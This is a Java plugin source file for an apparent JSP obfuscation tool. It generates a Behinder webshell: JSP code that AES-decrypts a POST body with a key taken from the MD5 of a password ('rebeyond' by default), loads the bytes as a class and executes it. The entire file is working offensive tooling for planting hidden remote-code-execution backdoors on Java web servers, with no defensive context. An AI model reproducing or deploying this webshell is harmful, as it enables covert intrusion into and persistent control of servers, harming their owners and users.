package com.t3stzer0.jspobfuscator.plugins.extensions.Gadget;

import com.t3stzer0.jspobfuscator.api.plugin.context.ExtensionContext;
import com.t3stzer0.jspobfuscator.api.plugin.exceptions.ExtensionException;
import com.t3stzer0.jspobfuscator.api.plugin.gadget.GadgetExtension;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.List;
import org.pf4j.Extension;

@Extension
public class Behinder implements GadgetExtension {

  protected final String shellType = "ShellType";
  protected final List<String> shellTypes = List.of("java<=8", "java9");
  protected final List<String> shellTemplate =
      List.of(
"""
if (request.getMethod().equals("POST")) {
  String k = "%s";
  session.putValue("u", k);
  Cipher c = Cipher.getInstance("AES");
  c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
  new U(this.getClass().getClassLoader())
      .g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())))
      .newInstance()
      .equals(pageContext);
}""",
"""
if (request.getMethod().equals("POST")) {
  String k = "%s";
  session.putValue("u", k);
  Cipher c = Cipher.getInstance("AES");
  c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
  new U(this.getClass().getClassLoader())
      .g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine())))
      .newInstance()
      .equals(pageContext);
}""");

  @Override
  public void initExtension(ExtensionContext ctx) {
    ctx.registerStringInput("key", true, "rebeyond");
    ctx.registerSelectInput(shellType, shellTypes, true, 0);
  }

  static String md5(String s) {

    try {
      MessageDigest md = MessageDigest.getInstance("MD5");
      byte[] digest = md.digest(s.getBytes(StandardCharsets.UTF_8));
      StringBuilder hex = new StringBuilder(digest.length * 2);
      for (byte b : digest) {
        hex.append(String.format("%02x", b & 0xff));
      }
      return hex.toString();
    } catch (Exception e) {
      throw new ExtensionException("MD5 calculation error:", e);
    }
  }

  String getHashKey(String key) {
    /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
    return md5(key).substring(0, 16);
  }

  @Override
  public List<String> getCode(ExtensionContext ctx) {
    String key = ctx.getStringInput("key");
    String template = shellTemplate.get(ctx.getSelectInput(shellType));
    return List.of(String.format(template, getHashKey(key)));
  }

  @Override
  public List<String> getDeclaration(ExtensionContext ctx) {
    return List.of(
"""
class U extends ClassLoader {
  U(ClassLoader c) {
    super(c);
  }
  public Class g(byte[] b) {
    return super.defineClass(b, 0, b.length);
  }
}""");
  }

  @Override
  public List<String> getImports(ExtensionContext ctx) {
    return List.of("java.util.*,javax.crypto.*,javax.crypto.spec.*");
  }

  @Override
  public String getHelp() {
    return "Behinder shell jsp/x: https://github.com/rebeyond/Behinder";
  }
}
